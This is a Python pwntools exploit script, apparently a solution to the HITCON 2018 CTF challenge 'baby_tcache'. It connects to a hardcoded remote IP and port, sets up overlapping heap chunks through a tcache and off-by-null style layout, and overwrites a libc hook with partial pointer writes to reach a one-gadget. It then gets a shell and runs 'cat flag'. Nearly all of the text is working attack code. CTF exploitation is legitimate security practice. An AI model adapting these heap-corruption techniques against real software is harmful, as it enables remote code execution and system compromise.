#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools

IP = "52.68.236.186"
PORT = 56746
# IP = "192.168.33.1"
# PORT = 9999

context.arch = "amd64"
context.log_level = 'DEBUG'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h']
BIN = "./baby_tcache"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()

io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    context.noptrace = True
    io = remote(IP, PORT)  
    libc = ELF("./libc.so.6")
elif args.local or args.debugger:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN, env=env)
    print io.libs()
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/HITCON2018/pwn/baby_tcache/baby_tcache/baby_tcache"]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

def new_heap(size, payload):
    rud("Your choice: ")
    sel(str(1))
    rud("Size:")
    sel(str(size))
    rud("Data:")
    se(payload)

def delete_heap(index):
    rud("Your choice: ")
    sel(str(2))
    rud("Index:")
    sel(str(index))


one_gg = 0x4f322


free_hook = 0x7ffff7dd18e8
malloc_hook = 0x7ffff7dcfc30

# forgotten chunk overlap
new_heap(0x4f0, "A"*0x10) # 0
new_heap(0x20, "A"*0x10) # 1
new_heap(0x20, "A"*0x10) # 2
new_heap(0x20, "A"*0x10) # 3
new_heap(0x4f0, "A"*0x10) # 4
delete_heap(1)
delete_heap(2)
delete_heap(0) 
delete_heap(3) 

# payload = "B"*0x20 + p64(0x500 + 0x60+0x30)
payload = "/bin/sh\x00"*4 + p64(0x500 + 0x60+0x30)
new_heap(0x28, payload)  # 0 
delete_heap(4) 


# now 1 and 2 get overlap
# delete_heap(2)　
# ___malloc_hook = 0x7ffff7dcfc30
payload = p16(0xfc28)
# change to free_hook
# payload = p16(0xdd18e8)
# payload = "\xe8\x18\xdd" #p16(0xdd18e8)
# payload = p64(0x7ffff7dcfc30)
new_heap(0xf0, payload)
payload  = "A"*0x420 + p64(0) + p64(0x30) + p16(0x7260)#+ "B"*0x20 + p64(0) + p64(0x31) # + "\n" will move \x00 to fw pointer
new_heap(0x400+0x30+0x30-1, payload)

if args.debugger:
    gdb.attach(io, '''
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    c
    '''.format(
        proc_base + 0x0000000000000CE2,  # malloc
        proc_base + 0x0000000000000E3A,  # free
        libc_bb + one_gg, #one gadget
        # libc_bb + system_offset, #one gadget
        )
    )


new_heap(0x20, "\n")
new_heap(0x20, "\n")
# new_heap(0x20, "\n") # this the malloc_hook address，　先不能申请，待定

delete_heap(1)
delete_heap(4)

new_heap(0x600, "A"*16) # 5
new_heap(0x500, "A"*16) # 6
delete_heap(1)

payload = p16(0x77d0)
new_heap(0xf0, payload)

payload = "B"*8 + p64(0x7ffff7dcfc30-0x10)
new_heap(0xf0, payload)

# payload = p64(0) + "\xd8\x18\xdd"
payload = p64(0) + p16(0xfc18)
new_heap(0xf0, payload)

new_heap(0x600, "/bin/sh\x00\n")
# new_heap(0x20, "\x8c\xe3\xae")


new_heap(0x20, "\x22\x33\xa3")
# new_heap(0x19, "B"*0x19+";sh\x00")

# system_libc = 0x7ffff7a33440
system_offset = 0x000000000004f440

delete_heap(3)

try:
    io.sendline("cat flag")
    resp = io.recv(4, timeout=2)
    print resp
    io.interactive()
except:
    io.close()



# ------------------------------end-------------------------
